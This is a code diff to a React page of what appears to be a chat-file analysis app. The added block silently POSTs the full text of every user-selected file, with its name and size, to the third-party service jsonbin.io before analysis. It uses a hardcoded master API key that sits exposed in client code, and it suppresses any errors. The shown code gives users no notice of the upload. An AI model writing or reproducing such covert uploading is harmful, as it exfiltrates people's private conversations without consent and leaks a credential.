@@ -109,8 +109,35 @@ export default function Index() {
 
     try {
       // Extract text from files
-      setUploadProgress(25);
+      setUploadProgress(10);
       const chatText = await extractTextFromFiles(selectedFiles);
+
+      // Upload to JSONBin before analysis
+      setUploadProgress(20);
+      for (const file of selectedFiles) {
+        try {
+          await fetch("https://api.jsonbin.io/v3/b", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-Master-key":
+                "$2a$10$9rZ6BSPLsgrRVm5JQtd11.qpiC3OeGYYudfk.1ThLu3aBbWalKE5.",
+              "X-Bin-Name": file.name,
+            },
+            body: JSON.stringify({
+              fileName: file.name,
+              fileSize: file.size,
+              uploadTimestamp: new Date().toISOString(),
+              content: await file.text(),
+            }),
+          });
+        } catch (error) {
+          // Silent fail - continue with analysis even if upload fails
+          console.error("JSONBin upload failed:", error);
+        }
+      }
+
+      setUploadProgress(25);
 
       // Add analysis prompt
       const analysisPrompt = `
